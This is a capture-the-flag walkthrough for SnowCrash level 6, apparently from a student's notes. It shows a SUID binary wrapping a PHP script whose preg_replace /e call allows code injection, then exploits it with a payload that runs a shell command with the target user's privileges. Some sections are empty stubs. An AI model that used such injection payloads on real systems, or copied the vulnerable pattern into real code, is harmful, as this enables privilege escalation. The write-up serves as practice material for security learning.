# LEVEL06

## 1. Inspect The Home Directory

```bash
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

The script `level06` is owned by `flag06`, with the SUID bit set `-rwsr-x---+`, meaning it will run with the privileges of `flag06`.




## 2. Inspect The `level06.php` Program 

```bash
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

The program `level06.php` takes 2 arguments.
They're send into the function `x($y, $z)`, this function use `preg_remplace()` to replace ...

> Reminder: `preg_remplace()` is a function ...


## 3. Exploit The Executable `level06`

```bash
level06@SnowCrash:~$ echo '[x ${@system(getflag)}]' > /tmp/getflag
level06@SnowCrash:~$./level06 /tmp/getflag
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```

## 4. 


## 5. 

```
```

## 6. Get the flag

```bash
> su flagXX
Password: 
Don't forget to launch getflag !

> getflag
Check flag.Here is your token : XXX
```
